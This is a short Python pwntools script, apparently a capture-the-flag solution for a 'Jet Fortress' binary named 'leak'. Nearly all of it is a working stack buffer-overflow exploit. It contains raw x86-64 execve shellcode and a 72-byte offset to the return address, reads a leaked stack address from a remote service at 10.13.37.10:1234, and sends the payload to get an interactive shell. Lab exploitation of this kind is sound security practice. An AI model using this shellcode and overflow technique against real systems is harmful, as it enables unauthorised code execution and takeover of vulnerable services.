#!/usr/bin/env python3
# _*_ CODING:UTF8 _*_
# powered by <shkz>
# My BOF @ JET FORTRESS -> LEAK Binary

"""
# ================================================================================================
# Pattern_Create_120 -> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
# Necessary to $EIP + RET: 72 bytes
# LEAKED address -> 0x7fffffffd6c0
# Final payload -> SHELLCODE - TRASH - RET
# ================================================================================================
"""

# \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05

from pwn import *

file = process('./leak')
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

p = remote('10.13.37.10', 1234)
p.recvuntil(b"Oops, I'm leaking!")

offset = 72 # bytes
trash = b"A" * (offset -len(shellcode))   # Fill with A for the missing..
ret = p64(int(p.recvuntil(b"\n"),16))   # Convert with p64

payload = shellcode + trash + ret   # My final payload

p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()

# It works! @ PWNED
